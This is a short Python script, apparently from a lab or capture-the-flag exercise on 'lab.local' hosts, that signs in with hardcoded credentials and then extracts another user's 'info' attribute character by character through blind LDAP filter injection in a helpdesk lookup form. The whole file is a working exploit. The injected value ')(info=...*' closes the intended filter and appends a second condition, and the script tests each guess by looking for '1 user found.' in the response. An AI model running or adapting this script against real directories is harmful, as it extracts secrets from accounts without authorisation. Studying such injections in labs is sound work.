import requests
import string

url = "https://skyrius.lab.local/login.php"
bala = "https://helpdesk.lab.local/lookup.php"
credentials = {
	"email": "d.audra@lab.local",
	"password": "Tikrasvartotojas123"
}
match = []
assign = ""
dictionary = string.ascii_lowercase + string.digits + string.punctuation
specialchars = {"*": r"\2a", "(": r"\28", ")": r"\29", "\\": r"\5c"}

with requests.Session() as session:
		response = session.post(url, data=credentials, verify="lab.pem")
		while True:
			for value in dictionary:
				escape = specialchars.get(value, value)
				lookup = {"bala" : f"v.henrikas@lab.local)(info={assign}{escape}*"}
				response = session.post(bala, data=lookup, verify="lab.pem")
				if "1 user found." in response.text:
					match.append(f"{value}")
					assign += escape
					break
			else:
				break
print("".join(match))
